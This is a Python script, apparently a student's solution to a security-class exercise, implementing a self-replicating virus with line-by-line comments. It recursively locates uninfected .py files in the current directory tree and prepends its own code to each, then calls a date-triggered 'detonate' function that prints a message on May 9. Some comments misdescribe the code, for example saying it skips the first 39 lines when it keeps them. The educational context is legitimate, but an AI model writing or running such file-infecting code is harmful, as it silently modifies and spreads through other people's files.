#!/usr/bin/python3

#Script: Ops 301 Class 14 Ops Challenge Solution
#Author: Marco Aliaga
#Date of latest revision: 30 MAR 2023
#Purpose: With the given python script as a starting point, comment before each line of code explaining what it does. Then, add a function that will detonate the virus on May 9th, 2023.

# Import libraries
import os
import datetime

# Define variables
SIGNATURE = "VIRUS"

# This function will locate all files in the given path and return a list of files that are not infected with the virus.
def locate(path):
    
    # This will create a list of all files in the given path.
    files_targeted = []
    
    # os.listdir() will return a list containing the names of the entries in the directory given by path.
    filelist = os.listdir(path)

    # This will loop through the list of files in the given path.
    for fname in filelist:
        
        # If they are directories, it will call the locate function again to check for files in the directory.
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))

        #If they are not directories, it will check if they are python files. If they are python files, it will check if they are infected with the virus.
        elif fname[-3:] == ".py":
            
            # This will set infected to False by default.
            infected = False
            for line in open(path+"/"+fname):
            
                # If the line contains the virus signature, it will set infected to True and break out of the loop.
                if SIGNATURE in line:
                    infected = True
                    break

            # If the file is not infected, it will add it to the list of files to be infected.
            if infected == False:
                files_targeted.append(path+"/"+fname)
    
    # This will return the list of files to be infected.
    return files_targeted


# This function will infect all files in the list of files to be infected.
def infect(files_targeted):

    # This will open the virus file and read it line by line.
    virus = open(os.path.abspath(__file__))
    virusstring = ""

    # This will loop through the lines in the virus file and add them to the virusstring variable.
    for i,line in enumerate(virus):

        # This will skip the first 39 lines of the virus file.
        if 0 <= i < 39:
            virusstring += line
    
    # This will close the virus file.
    virus.close
    
    # This will loop through the list of files to be infected.
    for fname in files_targeted:
        
        # This will open the file, read it, close it, and then open it again to write the virus string to the beginning of the file.
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# This function will detonate the virus on May 9th, 2023.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# This will call the locate function to get a list of files to be infected.
files_targeted = locate(os.path.abspath(""))

# This will call the infect function to infect all files in the list of files to be infected.
infect(files_targeted)

# This will call the detonate function to detonate the virus on May 9th, 2023.
detonate()
